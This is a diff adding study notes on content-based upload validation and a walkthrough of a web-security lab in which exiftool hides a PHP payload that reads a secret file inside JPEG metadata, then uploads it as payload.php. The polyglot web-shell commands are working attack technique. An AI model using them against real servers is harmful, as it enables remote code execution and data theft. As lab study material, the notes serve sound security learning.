@@ -1,0 +1,44 @@
+Flawed validation of the file's contents:
+
+More secure websites might check the content of the uploaded files rather than blindly trusting the Content-Type specified in a request. For example, if web server is expecting an image, it will check for properties of an image like width and height. In this case, we can't provide the website with a PHP file, since such a file will not have width or height.
+
+Also, certain file types may always have a specific sequence of bytes in their header or footer. These properties of files can be used as fingerprint to determine whether the content matches the expected file type. For example, JPEG files always start with these bytes: FF D8 FF
+
+Tools such as ExifTool can help us to craft a file that would match the expected file type bytes headers and footers while containing malicious code in it. 
+
+
+------------------------------
+------------------------------
+
+Lab: Remote code execution via polyglot web shell upload
+
+
+
+This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.
+
+To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.
+
+You can log in to your own account using the following credentials: wiener:peter
+
+-------------------------
+
+To solve this lab, we first need to install exiftool on our machine: sudo apt install exiftool.
+
+The main aim is to put our malicious code as part of meta data of a jpg image that we download from the internet. 
+
+First, we download an image from the internet. 
+Second, we a part of the meta data of the image we downloaded. The part that we are going to change is called Make: exiftool -Make="<?php echo file_get_contents('/home/carlos/secret');?>" Imagename.jpg -o payload.php
+
+This will change the Make to our payload and save the output file to a file called payload.php. This will not change anything about the image file type, we can check that if we do: exiftool -v payload.php
+
+We will see similar output for the image file except that the Make has been changed to our payload. 
+
+We will try to upload the payload.php file. 
+
+The file is uploaded successfully. If we went to where the file has been stored, we will see distorted text. 
+
+We will mark where the secret is by putting text on its right and on its left: exiftool -Make="<?php echo'Hello there'.file_get_contents('/home/carlos/secret').'Hello there';?> -o payload.php
+
+We will try to upload this file and access it. 
+
+Now, the secret is between the text that we added on both sides.
